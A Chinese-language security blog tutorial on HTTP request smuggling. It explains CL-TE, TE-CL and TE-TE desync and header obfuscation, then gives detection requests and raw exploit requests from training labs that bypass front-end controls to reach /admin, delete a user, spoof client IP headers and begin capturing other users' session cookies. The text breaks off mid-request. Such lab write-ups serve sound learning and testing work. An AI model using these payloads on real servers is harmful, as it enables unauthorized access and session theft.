<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="L0nm4r'Blog"><title>浅谈HTTP请求走私 | L0nm4r|Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 5.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">浅谈HTTP请求走私</h1><a id="logo" href="/.">L0nm4r|Blog</a><p class="description">hack to learn, not learn to hack</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">浅谈HTTP请求走私</h1><div class="post-meta">2021-01-31</div><div class="post-content"><h2 id="0x-01-知识背景"><a href="#0x-01-知识背景" class="headerlink" title="0x 01 知识背景"></a>0x 01 知识背景</h2><p>HTTP中存在一个重要概念是 Persistent Connection (持久连接)</p>
<p> HTTP/1.0 的持久连接通过<code>Connection: keep-alive</code>实现    </p>
<p> HTTP/1.1 则规定所有连接都必须是持久的，除非显式地在头部加上 <code>Connection: close</code> </p>
<p>在 <a target="_blank" rel="noopener" href="https://blog.csdn.net/u014569188/article/details/78912469">这篇文章里面可以了解到</a>:对于持久连接,一个传输实体必须有一个结束标志.并且存在两种HTTP请求结束的标志: <code>Content-Length </code>和<code>Transfer-Encoding</code></p>
<p><code>Content-Length</code>:直接给出了实体长度</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>12\r\n</span><br><span class="line">\r\n</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure>
<p><code>Transfer-Encoding</code>:实体进行分块编码  </p>
<p>每个分块包含十六进制的长度值和数据，长度值独占一行(长度不包括 <code>CRLF(\r\n)</code>)</p>
<blockquote>
<p>长度都是以字节为单位计算的</p>
</blockquote>
<p> 最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束 </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK\r\n</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">b\r\n</span><br><span class="line">01234567890\r\n</span><br><span class="line">5\r\n</span><br><span class="line">12345\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<p>这两种方式的区别可参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/u014569188/article/details/78912469">https://blog.csdn.net/u014569188/article/details/78912469</a></p>
<p>还有一个 <code>Content-Encoding </code>的东西经常和 <code>Transfer-Encoding </code>结合使用,具体可以参考上面那篇文章</p>
<p>为了缓解源站的压力，一般会在用户和后端服务器（源站）之间加设前置服务器，用以缓存、简单校验、负载均衡等，而前置服务器与后端服务器往往是在可靠的网络域中，IP 也是相对固定的，所以可以重用 TCP 连接来减少频繁 TCP 握手带来的开销 .</p>
<p>在用户和资源服务器之间还可能存在专用的防火墙服务器等.</p>
<h2 id="0x-02-HTTP请求走私"><a href="#0x-02-HTTP请求走私" class="headerlink" title="0x 02 HTTP请求走私"></a>0x 02 HTTP请求走私</h2><p>由于HTTP规范提供了两种不同的方法来指定HTTP消息的长度，因此单个消息可能会同时使用这两种方法,虽然HTTP规范中指出,如果 <code>Content-Length</code>和<code>Transfer-Encoding</code>头同时存在 ,<code>content-length</code>头则会被忽略,但是两个服务器之间可能有一个不支持<code>Transfer-Encoding</code>或者攻击者对TE进行了混淆,导致两个server之间的标准不一样,从而产生请求走私漏洞.</p>
<p>具体的三种情况:</p>
<ul>
<li><p> <code>CL.TE </code>:  前置服务器认为 <code>Content-Length</code> 优先级更高（或者根本就不支持 <code>Transfer-Encoding</code> ） ，后端认为 <code>Transfer-Encoding</code> 优先级更高 </p>
</li>
<li><p><code>TE-CL</code>：前置服务器认为 <code>Transfer-Encoding</code> 优先级更高，后端认为 <code>Content-Length</code> 优先级更高（或者不支持 <code>Transfer-Encoding</code> ）</p>
</li>
<li><p><code>TE-TE</code>：前置和后端服务器都支持 <code>Transfer-Encoding</code>，但可以通过混淆让它们在处理时产生分歧</p>
</li>
</ul>
<h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>发出两次下面的请求,可观察到服务器返回的error信息  <code>&quot;Unrecognized method GPOST&quot;</code></p>
<p><img src="1612096003402.png" alt="1612096003402"></p>
<p>前置服务器根据content-length把下面的实体数据全部发送了</p>
<blockquote>
<p>这里长度计算不包括第一个<code>\r\n</code>,这是请求头和请求体之间的边界</p>
</blockquote>
<p>然后后端服务器根据<code>Transfer-Encoding</code>,将<code>0\r\n\r\n</code>视为一个块结束的标志.G滞留在缓冲区.</p>
<p>然后再次发起请求的时候滞留的G和新的块拼接在了一起 ,就变成了<code>GPOST\r\nHOST:...</code></p>
<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>连续发送下面的请求</p>
<p><img src="1612097382479.png" alt="1612097382479"></p>
<p>前置服务器根据<code>Transfer-Encoding</code>判断请求边界,将整个请求体发送给后端服务器</p>
<p>然后后端服务器根据<code>Content-Length: 4</code>只对<code>5c\r\n</code>进行了处理,后面的部分滞留在缓冲区</p>
<p>然后再次发送请求,就会出现<code>&quot;Unrecognized method GPOST&quot;</code>的错误</p>
<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>对TE进行一些混淆</p>
<p><img src="1612097986236.png" alt="1612097986236"></p>
<p>两个服务器对存在两个Transfer-Encoding时的处理存在不一致,一个倾向Transfer-encoding,一个倾向 Transfer-Encoding</p>
<p>还有别的混淆如:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding[空格]: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[空格]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
<h2 id="0x03探测"><a href="#0x03探测" class="headerlink" title="0x03探测"></a>0x03探测</h2><h3 id="延时"><a href="#延时" class="headerlink" title="延时"></a>延时</h3><p>一般是返回500</p>
<ul>
<li>探测CL-TE</li>
</ul>
<p>前置服务器发送全部数据到后端,后端服务器没有接收到<code>0\r\n\r\n</code>而等待</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">\r\n</span><br><span class="line">1\r\n</span><br><span class="line">A\r\n</span><br><span class="line">X</span><br></pre></td></tr></table></figure>
<ul>
<li>探测TE-CL</li>
</ul>
<p>前置服务器只发送5字节,后端服务器等待第六个字节</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">X\r\n</span><br></pre></td></tr></table></figure>
<h3 id="根据不同的响应"><a href="#根据不同的响应" class="headerlink" title="根据不同的响应"></a>根据不同的响应</h3><ul>
<li>CL-TE</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 49\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">e\r\n</span><br><span class="line">q=smuggling&amp;x=\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /404 HTTP/1.1\r\n</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
<p>伪造的相应:返回error</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>xPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11</span><br><span class="line"></span><br><span class="line">q=smuggling</span><br></pre></td></tr></table></figure>
<ul>
<li>TE-CL</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">7c\r\n</span><br><span class="line">GET /404 HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 144\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>或者下面这个,利用的时候不用再计算长度了</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac991ff81e1155588027028a00a60085.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">5e</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="0x-04利用"><a href="#0x-04利用" class="headerlink" title="0x 04利用"></a>0x 04利用</h2><h3 id="bypass防火墙安全控制"><a href="#bypass防火墙安全控制" class="headerlink" title="bypass防火墙安全控制"></a>bypass防火墙安全控制</h3><ul>
<li>针对CL-TE</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acfe1fd11efd558780340c0d009d003d.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>116</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
<p>特权操作</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acfe1fd11efd558780340c0d009d003d.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>139</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/admin/delete?username=carlos</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
<ul>
<li>TE-CL</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ace51f0c1e67808d804d707500860021.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">71</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ace51f0c1e67808d804d707500860021.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">71</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ace51f0c1e67808d804d707500860021.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">87</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/admin/delete?username=carlos</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="bypass-ip等限制"><a href="#bypass-ip等限制" class="headerlink" title="bypass  ip等限制"></a>bypass  ip等限制</h3><p>请求头中的一些限制因素</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Host: vulnerable-website.com</span><br><span class="line">X-Forwarded-For: 1.3.3.7</span><br><span class="line">X-Forwarded-Proto: https</span><br><span class="line">X-TLS-Bits: 128</span><br><span class="line">X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256</span><br><span class="line">X-TLS-Version: TLSv1.2</span><br><span class="line">x-nr-external-service: external</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acf01fc11f920726807703ef005a003a.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>143</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">X-aEWnFO-Ip</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acf01fc11f920726807703ef005a003a.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>141</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/admin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Client-ip</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acf01fc11f920726807703ef005a003a.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>166</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/admin/delete?username=carlos</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">X-aEWnFO-Ip</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
<h3 id="窃取信息"><a href="#窃取信息" class="headerlink" title="窃取信息"></a>窃取信息</h3><p>可以捕获别人的请求(cookie,session等)</p>
<p>利用条件比较苛刻,可参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7501#toc-9">https://xz.aliyun.com/t/7501#toc-9</a></p>
<p>首先可以截取一个发送评论的包</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post/comment</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac771fff1e7151cd80977b71000800a1.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>400</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=m5fcVJxX7Eqcdq0sE5eccIv4GTQdZILj</span><br><span class="line"></span><br><span class="line">csrf=w7zSB0ypijpVohxpxKcMmKnWQMYNlmrw&amp;postId=1&amp;comment=test&amp;name=1&amp;email=1111%401111.com&amp;website=http%3A%2F%2Fwww.baidu.com%2F</span><br></pre></td></tr></table></figure>
<p>然后构造下面的数据</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac771fff1e7151cd80977b71000800a1.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>325</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"><span 